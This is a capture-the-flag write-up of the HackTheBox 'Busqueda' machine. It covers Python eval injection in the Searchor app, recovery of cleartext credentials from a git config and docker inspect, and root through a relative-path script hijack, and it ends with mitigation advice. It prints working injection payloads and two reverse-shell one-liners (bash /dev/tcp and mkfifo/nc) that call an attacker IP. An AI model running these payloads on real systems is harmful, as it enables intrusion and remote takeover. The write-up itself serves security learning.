---
title: "HackTheBox - Busqueda"
author: Nasrallah
description: ""
date: 2023-06-27 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, python, injection, docker, gitea]
img_path: /assets/img/hackthebox/machines/busqueda
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Busqueda](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

![](0.png)

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.129.48.189
Host is up (3.9s latency).
Not shown: 751 closed tcp ports (reset), 247 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found an Apache web server on port 80 with the domain name `searcher.htb` and OpenSSH on port 22.


### Web

Let's navigate to the web page.

![](1.png)

The website is called `Searchor` and it helps generate search queries for different search engines.

If we scroll to the bottom we can choose the search engine and type what we want to search for.

![](2.png)

Let's search for something and intercept the request with burp.

![](3.png)

There are two parameters used: `engine` and `query`.

In the response we can see that this is a python application and using `Werkzeug` as a web server, which means that the Apache we saw earlier acts as a proxy.

## **Foothold**

Since this is a python application, let's try injecting python code in the parameters.

![](4.png)

We managed to get code execution using the following payload:

```python
')+__import__('os').system('sleep 5')#
```

>The plus sign has to be url encoded.

Now let's get a reverse shell:

```python
')%2b__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.17.90/9001 0>&1"')#
```
>The special characters(>&) have to be url encoded

![](5.png)

![](6.png)

## **Privilege Escalation**

### svc --> root

Now we run `linpeas`.

![](7.png)

We found the subdomain `gitea.searcher.htb` which probably is running gitea. Let's add that to `/etc/hosts` ang navigate to the web page.

![](8.png)

We found two users `cody` and `administrator`, but there are no publicly listed repositories.

Trying to search for credentials of Gitea I used `grep` recursively to search for `cody` using the following command:

```bash
svc@busqueda:/var/www$ grep -Ri cody ./ 2>/dev/null
./app/.git/config:      url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
```

With that I managed to find `cody`'s password. Let's login

![](9.png)

We found `searcher`'s repository, nothing interesting.

Let's check our privileges using the `cody`'s password:

```shell
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

We can run a python script as root.

```shell
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

There couple options we can run with the script, the first is `docker-ps`:

```shell
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS             PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   7 months ago   Up About an hour   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   7 months ago   Up About an hour   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

This list the running docker containers.

The second option is `docker-inspect`

```shell
svc@busqueda:/tmp/sirius$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

We need to add a format and a container name.

Checking the [documentation](https://docs.docker.com/engine/reference/commandline/inspect/) of docker-inspect we find a way to get some useful information:

![](10.png)

Let's get `.Config` using the following command:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' mysql_db
```

```json
--format={"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}}
```

We found two different password, I couldn't switch to user root by I was able to login as administrator on Gitea using one of the passwords.

![](11.png)

This allows us to read the source code of the scripts.

![](12.png)

On `system-checkup.py` we can see that when we choose the option `full-checkup` the script runs `full-checkup.sh` that's on the current directory where we ran the script.

That means we can create a `full-checkup.sh` script on `/tmp` for example, run the sudo command with the option `full-checkup` and our script would get executed.

Let's create the script and put the following reverse shell in the file:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.17.90 9002 >/tmp/f
```

Now we give our script execute permissions and setup a listener.

Then we run the sudo command

![](13.png)

We have successfully got a root shell.

![](13.png)

## **Prevention and Mitigation**

### Searchor

The `Searchor` application was passing user input to `eval()` which considered very dangerous.

It's better to avoid using user input in code that is evaluated dynamically, and it it's not avoidable, a strong user input validation should be in place.

### Passwords

We managed to pull plain text passwords from config files which allowed us to further enumerate the machine.

Password should never be stored in plain text, instead they should be hashed using a strong hashing algorithm.

### System-check

The `system-check.py` was assuming that we'll be executing the script from the `scripts` directory and that's why it runs the `full-checkup.sh` from the current directory.

Commands and scripts should always be called with the full path

## Sources

<https://www.stackhawk.com/blog/command-injection-python/>

<https://docs.docker.com/engine/reference/commandline/inspect/>

<https://github.com/ArjunSharda/Searchor/>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).